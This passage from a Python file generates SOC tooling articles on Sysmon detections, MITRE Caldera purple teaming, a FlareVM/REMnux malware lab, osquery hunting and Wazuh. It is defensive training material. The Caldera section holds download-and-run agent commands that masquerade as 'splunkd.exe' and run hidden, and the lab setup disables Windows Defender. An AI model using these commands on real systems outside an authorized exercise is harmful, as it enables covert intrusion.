  Where-Object { $_.Message -match "MSSE-|msagent_|postex_" }
```

### Scenario: Lateral Movement Detection

```powershell
# Detect PsExec via named pipes (Event ID 18)
Get-WinEvent -FilterHashtable @{LogName="Microsoft-Windows-Sysmon/Operational"; Id=18} |
  Where-Object { $_.Message -match "psexec|svcctl" }

# Detect remote thread creation (Event ID 8)
Get-WinEvent -FilterHashtable @{LogName="Microsoft-Windows-Sysmon/Operational"; Id=8} |
  Where-Object { $_.Message -notmatch "csrss|wininit|winlogon" }

# Detect WMI lateral movement (Event ID 1)
Get-WinEvent -FilterHashtable @{LogName="Microsoft-Windows-Sysmon/Operational"; Id=1} |
  Where-Object { $_.Message -match "WmiPrvSE\.exe" -and $_.Message -match "CommandLine:.*powershell|cmd" }
```

## Integration with SOC Workflow

### Deploy via Group Policy

```
1. Create a GPO: Computer Configuration > Preferences > Files
   - Copy sysmon64.exe to C:\Windows\
   - Copy sysmonconfig.xml to C:\Windows\

2. Create Scheduled Task (one-time at startup):
   Action: C:\Windows\sysmon64.exe -accepteula -i C:\Windows\sysmonconfig.xml
   Or for updates: C:\Windows\sysmon64.exe -c C:\Windows\sysmonconfig.xml
```

### Forward to SIEM

```yaml
# Winlogbeat configuration for Sysmon
winlogbeat.event_logs:
  - name: Microsoft-Windows-Sysmon/Operational
    event_id: 1,3,5,7,8,10,11,12,13,17,18,22,23,25
    processors:
      - script:
          lang: javascript
          id: sysmon
          file: ${path.home}/module/sysmon/config/winlogbeat-sysmon.js
```

## Performance Tuning

| Setting | Impact | Recommendation |
|---|---|---|
| HashAlgorithms | CPU for hashing every process | Use sha256 only in production |
| ImageLoad (Event 7) | Very high volume | Use strict include filters |
| NetworkConnect (Event 3) | High volume | Filter by process, not by destination |
| FileCreate (Event 11) | Very high volume | Filter carefully, exclude temp files |
| DnsQuery (Event 22) | Moderate volume | Useful, keep enabled |
| ProcessAccess (Event 10) | High volume | Focus on lsass.exe as target |

## Best Practices

1. **Start with a community config** (SwiftOnSecurity) and customize from there
2. **Test configuration changes** on a pilot group before fleet deployment
3. **Monitor Sysmon log size** and adjust filters to control volume
4. **Forward Event IDs 1,3,8,10,17,22** as minimum to your SIEM
5. **Use IMPHASH** in HashAlgorithms for PE import table fingerprinting
6. **Update Sysmon regularly** - new event types are added in updates
7. **Combine with Sigma rules** for detection on Sysmon data in your SIEM

## Further Reading

- Sysmon documentation: https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
- SwiftOnSecurity config: https://github.com/SwiftOnSecurity/sysmon-config
- Sysmon modular: https://github.com/olafhartong/sysmon-modular
- TrustedSec Sysmon guide: https://www.trustedsec.com/blog/
"""
    ))

    # -------------------------------------------------------------------------
    # 15. MITRE Caldera for Purple Team Exercises
    # -------------------------------------------------------------------------
    articles.append((
        "MITRE Caldera for Purple Team Exercises",
        ["tooling", "caldera", "mitre", "purple-team", "red-team", "adversary-emulation", "attck"],
        r"""# MITRE Caldera for Purple Team Exercises

## Overview

MITRE Caldera is an open-source adversary emulation platform built and maintained
by MITRE. It automates the execution of ATT&CK-mapped techniques against live
endpoints, enabling purple team exercises where the red team runs realistic attack
scenarios while the blue team validates detection and response capabilities. Caldera
supports both automated and manual operations.

## Why It Matters

| Capability | SOC Benefit |
|---|---|
| ATT&CK-mapped operations | Tests specific techniques your detections claim to cover |
| Automated adversary profiles | Run consistent attack scenarios repeatedly |
| Agent-based execution | Deploy on endpoints for realistic testing |
| Plugin ecosystem | Extend with training, reporting, deception |
| Objective-based planning | AI-driven operation planning |
| Detection gap analysis | Identify what your SOC can and cannot see |

**MITRE ATT&CK Relevance:** Caldera can emulate techniques across all 14 ATT&CK
tactics. It is the reference platform for validating ATT&CK-based detections.

## Installation

### Server Setup

```bash
# Clone the repository
git clone https://github.com/mitre/caldera.git --recursive
cd caldera

# Install Python dependencies
pip install -r requirements.txt

# Start the server
python server.py --insecure --build

# Default credentials:
# Red team: admin / admin
# Blue team: blue / admin
# Access: http://localhost:8888
```

### Docker Deployment

```yaml
version: "3"
services:
  caldera:
    image: mitre/caldera:latest
    ports:
      - "8888:8888"
      - "7010:7010"   # Agent communication
      - "7012:7012"   # Agent communication (TCP)
    volumes:
      - ./caldera-data:/usr/src/app/data
    environment:
      - CALDERA_URL=http://YOUR_SERVER_IP:8888
```

### Agent Deployment

```powershell
# Deploy Sandcat agent on Windows target
# From Caldera UI: Agents > Deploy an Agent > Select "Sandcat"
# Copy and run the provided command:
$server="http://CALDERA_SERVER:8888";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$output="C:\Users\Public\splunkd.exe";
$wc.DownloadFile($url,$output);
Start-Process -FilePath $output -ArgumentList "-server $server -group red" -WindowStyle hidden;
```

```bash
# Deploy on Linux target
server="http://CALDERA_SERVER:8888";
curl -s -X POST $server/file/download -H "file:sandcat.go" -H "platform:linux" -o splunkd;
chmod +x splunkd;
./splunkd -server $server -group red &
```

## Core Concepts

### Abilities

Abilities are individual ATT&CK techniques implemented as executable commands:

```yaml
# Example ability: T1059.001 - PowerShell Execution
- id: ability-uuid-here
  name: Run PowerShell Command
  description: Execute a PowerShell command on the target
  tactic: execution
  technique:
    attack_id: T1059.001
    name: "Command and Scripting Interpreter: PowerShell"
  platforms:
    windows:
      psh:
        command: |
          Get-Process | Select-Object Name, Id, Path
```

### Adversary Profiles

Adversary profiles chain abilities into realistic attack sequences:

```
Built-in profiles:
  - Discovery: Basic system enumeration (whoami, ipconfig, etc.)
  - Collection: File discovery and staging
  - Credential Access: Mimikatz, hashdump techniques
  - Lateral Movement: PsExec, WMI, remote service creation
  - Exfiltration: Data staging and transfer
  - Advanced Persistent Threat: Full kill chain simulation
```

### Operations

```
An Operation is a running instance of an Adversary Profile:

1. Navigate to Operations > Create Operation
2. Configure:
   - Name: "Q1 Purple Team Exercise"
   - Adversary: Select profile (e.g., "APT29 Emulation")
   - Group: Select agent group (e.g., "red")
   - Planner: Choose execution strategy
     - atomic: Run abilities one at a time
     - batch: Run all at once
     - buckets: ATT&CK tactic order
   - Obfuscation: plain-text, base64, or custom
   - Autonomous: Yes (automated) or No (manual approval)
3. Start operation
4. Monitor progress in real-time
```

## Running a Purple Team Exercise

### Phase 1: Planning

```
1. Define scope and objectives:
   - Which ATT&CK techniques to test?
   - Which endpoints are in scope?
   - What detections should fire?

2. Create a detection checklist:
   | Technique | Expected Detection | SIEM Rule | Sysmon Event |
   |---|---|---|---|
   | T1059.001 | PowerShell alert | Rule #42 | Event ID 1 |
   | T1003.001 | LSASS access alert | Rule #87 | Event ID 10 |
   | T1547.001 | Persistence alert | Rule #55 | Event ID 13 |

3. Notify stakeholders (SOC manager, IR team, NOC)
4. Document start time and authorized systems
```

### Phase 2: Execution

```
1. Deploy agents to target endpoints
2. Start the operation with the selected adversary profile
3. Monitor Caldera operation progress

Example ATT&CK chain:
  T1082 System Information Discovery
    -> T1083 File and Directory Discovery
    -> T1059.001 PowerShell Execution
    -> T1003.001 LSASS Memory Dump
    -> T1547.001 Registry Run Key Persistence
    -> T1041 Exfiltration Over C2
```

### Phase 3: Blue Team Validation

```
For each executed technique, verify:

1. Did the SIEM generate an alert?
   - Check timestamp alignment
   - Verify alert severity is appropriate
   - Confirm the right analyst queue received it

2. Did endpoint detection fire?
   - Check Sysmon logs for expected Event IDs
   - Verify EDR alert generation
   - Check if automated containment triggered

3. Were the logs available?
   - Event logs forwarded to SIEM?
   - Correct parsing and field extraction?
   - Sufficient retention period?

4. Document gaps:
   - No alert: Detection gap
   - Alert but wrong severity: Tuning needed
   - Alert but delayed: Collection/forwarding issue
   - Log missing: Logging gap
```

### Phase 4: Reporting

```
Report should include:
  - Detection rate: X of Y techniques detected (Z%)
  - Gap analysis table: Technique | Detected | Alert ID | Gap
  - Recommendations prioritized by risk
  - MITRE ATT&CK Navigator layer showing coverage
```

## Custom Abilities

```yaml
# Create custom ability for your environment
# Save as: data/abilities/execution/custom-enum.yml
- id: 9a8b7c6d-5e4f-3a2b-1c0d-9e8f7a6b5c4d
  name: Custom Domain Enumeration
  description: Enumerate domain trusts and admin groups
  tactic: discovery
  technique:
    attack_id: T1482
    name: Domain Trust Discovery
  platforms:
    windows:
      psh:
        command: |
          nltest /domain_trusts
          net group "Domain Admins" /domain
          Get-ADTrust -Filter *
        timeout: 60
```

## Plugins

| Plugin | Purpose |
|---|---|
| Stockpile | Default ability/adversary repository |
| Compass | ATT&CK Navigator layer generation |
| Training | Interactive Caldera training scenarios |
| Response | Blue team automated response abilities |
| Deception | Honeypot and deception deployment |
| Human | Human interaction simulation |
| Atomic | Integration with Atomic Red Team tests |

## Integration with SOC Workflow

### Generate ATT&CK Navigator Layers

```
1. After an operation completes, go to Operations > View operation
2. Click "Download Report"
3. Use the Compass plugin to generate a Navigator layer
4. Overlay with your detection coverage layer
5. Gaps are clearly visible as uncovered techniques
```

### Automated Regression Testing

```bash
# Schedule monthly purple team exercises
# cron: 0 2 1 * * /opt/caldera/run_exercise.sh

#!/bin/bash
# run_exercise.sh
curl -X POST "http://localhost:8888/api/v2/operations" \
  -H "KEY: ADMIN_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Monthly Regression - '"$(date +%Y-%m)"'",
    "adversary": {"adversary_id": "your-adversary-profile-id"},
    "group": "red",
    "planner": {"id": "atomic"},
    "auto_close": true
  }'
```

## Best Practices

1. **Start small** - test 5-10 techniques before running full adversary profiles
2. **Coordinate with SOC** - purple team is collaborative, not adversarial
3. **Document everything** - timestamps, systems, techniques, results
4. **Run in production** (carefully) - lab results do not reflect real detection
5. **Build regression suites** - re-run after SIEM rule changes to prevent regression
6. **Map to your threat model** - prioritize techniques relevant to your industry
7. **Use the results** - detection gaps should drive engineering priorities

## Further Reading

- MITRE Caldera: https://caldera.mitre.org/
- Caldera documentation: https://caldera.readthedocs.io/
- ATT&CK Navigator: https://mitre-attack.github.io/attack-navigator/
- MITRE ATT&CK: https://attack.mitre.org/
"""
    ))

    # -------------------------------------------------------------------------
    # 16. FlareVM and REMnux Malware Analysis Lab Setup
    # -------------------------------------------------------------------------
    articles.append((
        "FlareVM and REMnux Malware Analysis Lab Setup",
        ["tooling", "flarevm", "remnux", "malware-analysis", "reverse-engineering", "sandbox", "dfir"],
        r"""# FlareVM and REMnux Malware Analysis Lab Setup

## Overview

FlareVM is a Windows-based malware analysis distribution created by Mandiant (formerly
FireEye), while REMnux is a Linux-based distribution maintained by Lenny Zeltser
(SANS). Together they provide a complete malware analysis laboratory. FlareVM handles
Windows-specific analysis (PE files, .NET, Office macros, debugging), while REMnux
focuses on network analysis, memory forensics, and Linux-based tools.

## Why It Matters

| Capability | SOC Benefit |
|---|---|
| Safe analysis environment | Isolate malware from production network |
| Pre-built tooling | Hundreds of analysis tools pre-installed |
| Windows + Linux coverage | Analyze malware targeting any platform |
| Network simulation | Fake internet services for dynamic analysis |
| Memory forensics | Analyze memory dumps from compromised systems |
| Reversing tools | Disassembly, debugging, decompilation |

**MITRE ATT&CK Relevance:** Malware analysis supports understanding of T1027
(Obfuscated Files), T1059 (Command Interpreters), T1055 (Process Injection),
T1071 (Application Layer Protocol), T1105 (Ingress Tool Transfer), T1140
(Deobfuscate/Decode Files).

## Lab Architecture

```
                    +-------------------+
                    |   Host Machine    |
                    |  (Hypervisor)     |
                    +--------+----------+
                             |
              +--------------+--------------+
              |                             |
    +---------v---------+     +-------------v-------+
    |     FlareVM       |     |      REMnux          |
    |  (Windows 10/11)  |     |   (Ubuntu-based)     |
    |  Analysis VM      |     |  Network Services    |
    |                   |     |  + Linux Analysis    |
    | IP: 10.0.0.10     |     | IP: 10.0.0.20        |
    +-------------------+     +-----------------------+
              |                             |
              +-------- Host-Only -----------+
                    Network (no internet)
```

## FlareVM Setup

### Prerequisites

```
1. Fresh Windows 10/11 VM (clean install)
2. At least 60 GB disk, 4 GB RAM, 2 CPU cores
3. Windows Defender DISABLED (it will quarantine analysis tools)
4. Windows Updates applied, then auto-update disabled
5. Snapshot taken before FlareVM installation
```

### Installation

```powershell
# Step 1: Disable Windows Defender and Tamper Protection
# Settings > Windows Security > Virus & threat protection > Manage settings
# Turn off: Real-time protection, Cloud-delivered, Automatic sample submission

# Step 2: Disable Defender via Group Policy
gpedit.msc
# Computer Configuration > Administrative Templates > Windows Components
# > Microsoft Defender Antivirus > Turn off Microsoft Defender Antivirus = Enabled

# Step 3: Install FlareVM
# Open PowerShell as Administrator
Set-ExecutionPolicy Unrestricted -Force
(New-Object net.webclient).DownloadFile(
  'https://raw.githubusercontent.com/mandiant/flare-vm/main/install.ps1',
  "$env:TEMP\install.ps1"
)
Unblock-File "$env:TEMP\install.ps1"
& "$env:TEMP\install.ps1"

# Installation takes 30-60 minutes
# System will reboot during installation
# Take a snapshot after installation completes
```

### Key Tools Included in FlareVM

| Category | Tools |
|---|---|
| Disassemblers | IDA Free, Ghidra, x64dbg, Binary Ninja |
| Debuggers | x64dbg, WinDbg, OllyDbg |
| .NET Analysis | dnSpy, ILSpy, de4dot |
| PE Analysis | PEStudio, PEBear, PE-sieve, CFF Explorer |
| Office/Macro | olevba, oletools, ViperMonkey |
| Network | Wireshark, Fiddler, FakeNet-NG |
| Utilities | CyberChef, HxD, 7-Zip, Autoruns, Process Monitor |
| Scripting | Python 3, PowerShell, YARA |
| Sandbox | Cuckoo compatibility tools |
| Memory | Volatility 3, Rekall |

## REMnux Setup

### Installation

```bash
# Option 1: Download the OVA
# https://docs.remnux.org/install-distro/get-virtual-appliance

# Option 2: Install on existing Ubuntu 20.04
wget https://REMnux.org/remnux-cli
mv remnux-cli /usr/local/bin/remnux
chmod +x /usr/local/bin/remnux
sudo remnux install --mode=full

# Option 3: Docker (lightweight, individual tools)
docker pull remnux/remnux-distro
```

### Key Tools in REMnux

| Category | Tools |
|---|---|
| Network Analysis | Wireshark, tcpdump, NetworkMiner |
| Network Services | INetSim, FakeNet-NG, accept-all-ips |
| Static Analysis | YARA, ssdeep, pefile, oletools |
| Dynamic Analysis | strace, ltrace, fakeDNS |
| Memory Forensics | Volatility 3, bulk_extractor |
| Document Analysis | pdfid, pdf-parser, olevba, XLMMacroDeobfuscator |
| JavaScript | SpiderMonkey, Node.js, box-js |
| Deobfuscation | CyberChef, base64dump, xorsearch |
| PE Analysis | pefile, peframe, MASTIFF |
| Web | Burp Suite, mitmproxy, thug |

## Network Configuration

### INetSim (Fake Internet on REMnux)

```bash
# INetSim simulates common internet services
# Edit configuration:
sudo vi /etc/inetsim/inetsim.conf

# Key settings:
service_bind_address  10.0.0.20
dns_default_ip        10.0.0.20
start_service dns
start_service http
start_service https
start_service smtp
start_service ftp

# Start INetSim
sudo inetsim

# INetSim will respond to:
# DNS queries -> resolves everything to 10.0.0.20
# HTTP/HTTPS -> serves a default page, logs all requests
# SMTP -> accepts all emails, logs content
# FTP -> accepts connections, logs file transfers
```

### FakeNet-NG (on FlareVM)

```powershell
# FakeNet-NG intercepts all network traffic on the analysis machine
# and responds with fake services

# Start FakeNet-NG
cd C:\Tools\FakeNet-NG
FakeNet.exe

# FakeNet intercepts:
# DNS, HTTP, HTTPS, SMTP, FTP, IRC, and custom TCP/UDP
# All traffic is logged with full packet details
# Useful for capturing C2 domains and URLs without internet
```

## Analysis Workflow

### Static Analysis

```bash
# On REMnux: Quick triage of a PE file
file suspicious.exe
strings suspicious.exe | head -50
ssdeep suspicious.exe
md5sum suspicious.exe && sha256sum suspicious.exe
pefile suspicious.exe

# YARA scan
yara -r /opt/yara-rules/malware/ suspicious.exe

# On FlareVM: Deep PE analysis
# Open in PEStudio for imports, sections, indicators
# Open in CFF Explorer for header analysis
# Open in IDA Free or Ghidra for disassembly
```

### Dynamic Analysis

```
On FlareVM:
1. Start Process Monitor (procmon.exe) with filters:
   - Process Name is suspicious.exe
   - Operation is WriteFile, RegSetValue, Process Create
2. Start Wireshark or FakeNet-NG
3. Start Process Explorer
4. Take a VM snapshot
5. Execute the malware
6. Wait 2-5 minutes for behavior
7. Analyze:
   - Process Monitor: File/registry/network activity
   - Process Explorer: Child processes, DLLs, connections
   - FakeNet/Wireshark: C2 communications
8. Revert to snapshot
```

### Document/Macro Analysis

```bash
# On REMnux: Analyze Office macros
olevba malicious.docm

# Check for auto-execution triggers
olevba -a malicious.docm | grep -i "autoopen\|document_open\|auto_open"

# Extract macro code
olevba -c malicious.docm > macro_code.vba

# Analyze PDF
pdfid suspicious.pdf
pdf-parser --search "/JavaScript" suspicious.pdf
pdf-parser --object 10 suspicious.pdf

# Deobfuscate JavaScript
echo "var x = 'eval'; window[x](payload);" | node /opt/box-js/run.js
```

### Memory Forensics

```bash
# On REMnux: Analyze memory dump with Volatility 3
vol3 -f memory.dmp windows.pslist     # List processes
vol3 -f memory.dmp windows.pstree     # Process tree
vol3 -f memory.dmp windows.netscan    # Network connections
vol3 -f memory.dmp windows.malfind    # Injected code
vol3 -f memory.dmp windows.cmdline    # Command lines
```

## Real Investigation Example

### Scenario: Analyzing a Phishing Attachment

```
1. TRIAGE (REMnux): olevba attachment.docm -> find AutoOpen macro + download URL
2. NETWORK SETUP: Start INetSim on REMnux, point FlareVM DNS to REMnux
3. DYNAMIC (FlareVM): Start procmon + FakeNet, open doc, enable macros, observe behavior
4. ANALYZE: PEStudio for imports/strings, Ghidra for C2 protocol reverse engineering
5. REPORT: Document IOCs (hashes, URLs, IPs), map to ATT&CK, submit to threat intel
```

## Best Practices

1. **Always work on snapshots** - revert after each analysis session
2. **Use host-only networking** - never connect analysis VMs to production
3. **Disable shared folders** between host and analysis VMs
4. **Update tools regularly** - run `choco upgrade all` on FlareVM
5. **Document your analysis** with screenshots and tool output
6. **Submit unique samples** to VirusTotal/MalwareBazaar (check company policy)
7. **Build a sample archive** with password-protected ZIPs (password: "infected")
8. **Practice regularly** with samples from MalwareBazaar or malware-traffic-analysis.net

## Further Reading

- FlareVM GitHub: https://github.com/mandiant/flare-vm
- REMnux documentation: https://docs.remnux.org/
- Practical Malware Analysis (book): https://nostarch.com/malware
- MalwareBazaar: https://bazaar.abuse.ch/
"""
    ))

    # -------------------------------------------------------------------------
    # 17. osquery for Endpoint Visibility and Hunting
    # -------------------------------------------------------------------------
    articles.append((
        "osquery for Endpoint Visibility and Hunting",
        ["tooling", "osquery", "endpoint", "visibility", "threat-hunting", "sql", "fleet"],
        r"""# osquery for Endpoint Visibility and Hunting

## Overview

osquery is an open-source endpoint agent originally developed by Facebook (Meta)
that exposes operating system information as a relational database. You query
endpoints using SQL syntax, making it accessible to anyone who knows basic SQL.
It runs on Windows, macOS, and Linux, providing a unified query interface across
all platforms for threat hunting, compliance checking, and incident response.

## Why It Matters

| Capability | SOC Benefit |
|---|---|
| SQL-based queries | Low learning curve for analysts |
| Cross-platform | Same queries on Windows, Linux, macOS |
| Scheduled queries | Continuous monitoring via query packs |
| Low resource usage | Lightweight daemon, minimal CPU/RAM |
| Fleet management | Scale to thousands of endpoints |
| Extensible | Custom tables via extensions |

**MITRE ATT&CK Relevance:** osquery detects T1547 (Boot/Logon Autostart), T1053
(Scheduled Tasks), T1543 (System Process), T1059 (Command Interpreters), T1003
(Credential Dumping artifacts), T1071 (network connections), T1036 (Masquerading).

## Installation

### Windows

```powershell
# Download MSI installer
Invoke-WebRequest "https://pkg.osquery.io/windows/osquery-5.12.1.msi" -OutFile osquery.msi

# Install silently
msiexec /i osquery.msi /quiet

# osquery installs to C:\Program Files\osquery\
# Interactive shell:
& "C:\Program Files\osquery\osqueryi.exe"
```

### Linux (Ubuntu/Debian)

```bash
# Add repository
export OSQUERY_KEY=1484120AC4E9F8A1A577AEEE97A80C63C9D8B80B
sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys $OSQUERY_KEY
sudo add-apt-repository "deb [arch=amd64] https://pkg.osquery.io/deb deb main"
sudo apt update && sudo apt install -y osquery

# Interactive shell
osqueryi

# Start as daemon
sudo systemctl start osqueryd
sudo systemctl enable osqueryd
```

### macOS

```bash
# Download and install package
curl -L https://pkg.osquery.io/darwin/osquery-5.12.1.pkg -o osquery.pkg
sudo installer -pkg osquery.pkg -target /
osqueryi
```

## Core Usage

### Interactive Shell Queries

```sql
-- System information
SELECT hostname, cpu_brand, physical_memory, hardware_vendor
FROM system_info;

-- Running processes with details
SELECT pid, name, path, cmdline, uid, state, resident_size
FROM processes
ORDER BY resident_size DESC
LIMIT 20;

-- Listening ports with process info
SELECT p.name, p.path, lp.port, lp.protocol, lp.address
FROM listening_ports lp
JOIN processes p ON lp.pid = p.pid
WHERE lp.port != 0;

-- Active network connections
SELECT p.name, p.path, ps.remote_address, ps.remote_port, ps.state
FROM process_open_sockets ps
JOIN processes p ON ps.pid = p.pid
WHERE ps.remote_address != "" AND ps.remote_address != "127.0.0.1"
ORDER BY p.name;

-- Installed programs
SELECT name, version, install_date, publisher
FROM programs
ORDER BY install_date DESC;

-- Users and their groups
SELECT u.username, u.uid, u.directory, u.shell, g.groupname
FROM users u
JOIN user_groups ug ON u.uid = ug.uid
JOIN groups g ON ug.gid = g.gid;

-- Logged in users
SELECT user, host, time, tty
FROM logged_in_users;
```

### Threat Hunting Queries

```sql
-- Find processes running from temp directories (suspicious)
SELECT pid, name, path, cmdline, parent
FROM processes
WHERE path LIKE '%\Temp\%'
   OR path LIKE '%\tmp\%'
   OR path LIKE '%\AppData\Local\Temp\%';

-- Detect unsigned running processes (Windows)
SELECT p.name, p.path, a.result AS signed, a.authority
FROM processes p
JOIN authenticode a ON p.path = a.path
WHERE a.result != 'trusted';

-- Find persistence via scheduled tasks
SELECT name, action, path, enabled, last_run_time, next_run_time
FROM scheduled_tasks
WHERE enabled = 1
  AND path NOT LIKE '%Microsoft%'
  AND path NOT LIKE '%Windows%';

-- Registry run keys (persistence)
SELECT name, path, data, type
FROM registry
WHERE key LIKE 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run%'
   OR key LIKE 'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run%';

-- Find services with suspicious paths
SELECT name, display_name, path, start_type, status, user_account
FROM services
WHERE path LIKE '%\Temp\%'
   OR path LIKE '%cmd.exe%'
   OR path LIKE '%powershell%'
   OR path LIKE '%\AppData\%';

-- Detect processes with spoofed names (wrong directory)
SELECT name, path, pid, parent
FROM processes
WHERE (name = 'svchost.exe' AND path NOT LIKE 'C:\Windows\System32\svchost.exe')
   OR (name = 'lsass.exe' AND path NOT LIKE 'C:\Windows\System32\lsass.exe')
   OR (name = 'csrss.exe' AND path NOT LIKE 'C:\Windows\System32\csrss.exe');

-- DNS cache entries (Windows)
SELECT name, type, answer
FROM windows_dns_cache
WHERE name NOT LIKE '%.microsoft.com'
  AND name NOT LIKE '%.windows.com';

-- Browser extensions (potential malicious addons)
SELECT identifier, name, version, path, browser_type
FROM chrome_extensions
WHERE NOT name LIKE 'Google%';

-- Open files and handles
SELECT p.name, p.pid, pof.path
FROM process_open_files pof
JOIN processes p ON pof.pid = p.pid
WHERE pof.path LIKE '%password%'
   OR pof.path LIKE '%credential%'
   OR pof.path LIKE '%shadow%';
```

### Compliance and Hardening Queries

```sql
-- Audit local admin accounts
SELECT u.username, u.uid, ug.gid FROM users u
JOIN user_groups ug ON u.uid = ug.uid WHERE ug.gid = 544;

-- Check for unpatched software
SELECT hotfix_id, description, installed_on FROM patches ORDER BY installed_on DESC LIMIT 20;

-- Verify BitLocker encryption status
SELECT device_id, drive_letter, encryption_method, protection_status FROM bitlocker_info;
```

## Configuration (osqueryd)

```json
{
  "options": {
    "config_plugin": "filesystem",
    "logger_plugin": "filesystem",
    "logger_path": "/var/log/osquery",
    "host_identifier": "hostname",
    "worker_threads": "2"
  },
  "schedule": {
    "process_check": {
      "query": "SELECT pid, name, path, cmdline FROM processes WHERE path LIKE '%Temp%';",
      "interval": 300
    },
    "persistence_check": {
      "query": "SELECT name, path, data FROM registry WHERE key LIKE '%CurrentVersion\\Run%';",
      "interval": 900
    }
  },
  "packs": {
    "incident-response": "/opt/osquery/share/osquery/packs/incident-response.conf",
    "vuln-management": "/opt/osquery/share/osquery/packs/vuln-management.conf"
  }
}
```

## Fleet Management with FleetDM

FleetDM is the most popular osquery fleet manager. Deploy via Docker, enroll endpoints
with enrollment secrets, and run live queries across your entire fleet from a web UI.

## Real Investigation Example

### Scenario: Hunting for Lateral Movement

```sql
-- Step 1: Find RDP sessions (Event ID 4624, Type 10)
SELECT pid, name, path, cmdline
FROM processes
WHERE name = 'mstsc.exe'
   OR name = 'tscon.exe';

-- Step 2: Check for PsExec service
SELECT name, display_name, path, status
FROM services
WHERE name LIKE '%PSEXE%'
   OR path LIKE '%psexec%';

-- Step 3: Find WMI process creation
SELECT pid, name, path, cmdline, parent
FROM processes
WHERE parent IN (
  SELECT pid FROM processes WHERE name = 'WmiPrvSE.exe'
);

-- Step 4: Check for new admin accounts
SELECT username, uid, directory, type
FROM users
WHERE uid >= 1000
  AND username NOT IN ('known_user1', 'known_user2');

-- Step 5: Network connections to internal hosts on admin ports
SELECT p.name, ps.remote_address, ps.remote_port
FROM process_open_sockets ps
JOIN processes p ON ps.pid = p.pid
WHERE ps.remote_port IN (135, 445, 3389, 5985, 5986)
  AND ps.remote_address LIKE '10.%';
```

## Integration with SOC Workflow

### Forward Logs to SIEM

```json
{
  "options": {
    "logger_plugin": "tls",
    "logger_tls_endpoint": "/api/v1/osquery/log",
    "logger_tls_period": 10
  }
}
```

```bash
# Or use Filebeat to forward osquery JSON logs
# filebeat.yml:
# filebeat.inputs:
#   - type: log
#     paths: ["/var/log/osquery/osqueryd.results.log"]
#     json.keys_under_root: true
```

## Best Practices

1. **Start with built-in packs** (incident-response, vuln-management) before custom
2. **Use schedule intervals wisely** - 300s for critical, 900s for routine
3. **Avoid expensive queries** in scheduled packs (JOINs on large tables)
4. **Deploy via fleet manager** (FleetDM) for centralized management
5. **Build query libraries** organized by ATT&CK tactic for hunting exercises
6. **Combine with Sysmon** - osquery for point-in-time state, Sysmon for events
7. **Test queries locally** in osqueryi before deploying to production

## Further Reading

- osquery documentation: https://osquery.readthedocs.io/
- osquery schema: https://osquery.io/schema/
- FleetDM: https://fleetdm.com/
- osquery packs: https://github.com/osquery/osquery/tree/master/packs
"""
    ))

    # -------------------------------------------------------------------------
    # 18. Wazuh HIDS Deployment and Rule Writing
    # -------------------------------------------------------------------------
    articles.append((
        "Wazuh HIDS Deployment and Rule Writing",
        ["tooling", "wazuh", "hids", "ids", "siem", "detection", "rules", "endpoint"],
        r"""# Wazuh HIDS Deployment and Rule Writing

## Overview

Wazuh is an open-source security platform that provides host-based intrusion
detection (HIDS), log analysis, file integrity monitoring (FIM), vulnerability
detection, configuration assessment, and incident response capabilities. It evolved
from OSSEC and adds a modern management interface, Elasticsearch integration, and
an extensive ruleset. Wazuh is one of the most comprehensive free security monitoring
solutions available.

## Why It Matters

| Capability | SOC Benefit |
|---|---|
| Host-based IDS | Detect attacks at the endpoint level |
| File integrity monitoring | Alert on unauthorized file changes |
| Log analysis | Parse and alert on OS and application logs |
| Vulnerability detection | Identify unpatched software |
| Compliance checking | CIS benchmarks, PCI DSS, HIPAA |
| Active response | Automated blocking and remediation |
| SIEM integration | Built-in Elasticsearch + Kibana dashboards |

**MITRE ATT&CK Relevance:** Wazuh provides coverage for T1547 (Autostart Execution),
T1053 (Scheduled Tasks), T1059 (Command Interpreters), T1070 (Indicator Removal),
T1078 (Valid Accounts), T1110 (Brute Force), T1222 (File Permissions Modification).

## Installation

### All-in-One Deployment (Single Server)

```bash
# Wazuh provides an installation assistant
curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh
sudo bash wazuh-install.sh -a

# This installs:
# - Wazuh manager (agent management + rule engine)
# - Wazuh indexer (Elasticsearch-based, for log storage)
# - Wazuh dashboard (Kibana-based, for visualization)

# Default credentials are generated during installation
# Check: /root/wazuh-install-files/wazuh-passwords.txt

# Access dashboard: https://YOUR_SERVER_IP:443
```

### Docker Deployment

```bash
# Clone the Wazuh Docker repository
git clone https://github.com/wazuh/wazuh-docker.git -b v4.7.0
cd wazuh-docker/single-node

# Generate certificates
docker compose -f generate-indexer-certs.yml run --rm generator

# Start the stack
docker compose up -d

# Dashboard: https://localhost:443
# Default: admin / SecretPassword
```

### Agent Deployment

```powershell
# Windows agent
Invoke-WebRequest "https://packages.wazuh.com/4.x/windows/wazuh-agent-4.7.0-1.msi" -OutFile wazuh-agent.msi
msiexec /i wazuh-agent.msi /q WAZUH_MANAGER="10.0.0.100" WAZUH_AGENT_NAME="ws-042"

# Start the agent
net start WazuhSvc
```

```bash
# Linux agent (Ubuntu)
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --dearmor -o /usr/share/keyrings/wazuh.gpg
echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" | \
  tee /etc/apt/sources.list.d/wazuh.list
apt update && WAZUH_MANAGER="10.0.0.100" apt install -y wazuh-agent
systemctl start wazuh-agent
systemctl enable wazuh-agent
```

## Core Configuration

### Manager Configuration (ossec.conf)

```xml
<!-- /var/ossec/etc/ossec.conf - key sections -->
<ossec_config>
  <syscheck>
    <frequency>43200</frequency>
    <directories check_all="yes" realtime="yes">/etc,/usr/bin,/usr/sbin</directories>
    <directories check_all="yes" realtime="yes">C:\Windows\System32</directories>
    <ignore type="sregex">.log$|.tmp$</ignore>
  </syscheck>

  <localfile>
    <log_format>eventchannel</log_format>
    <location>Security</location>
  </localfile>

  <localfile>
    <log_format>eventchannel</log_format>
    <location>Microsoft-Windows-Sysmon/Operational</location>
  </localfile>

  <active-response>
    <command>firewall-drop</command>
    <location>local</location>
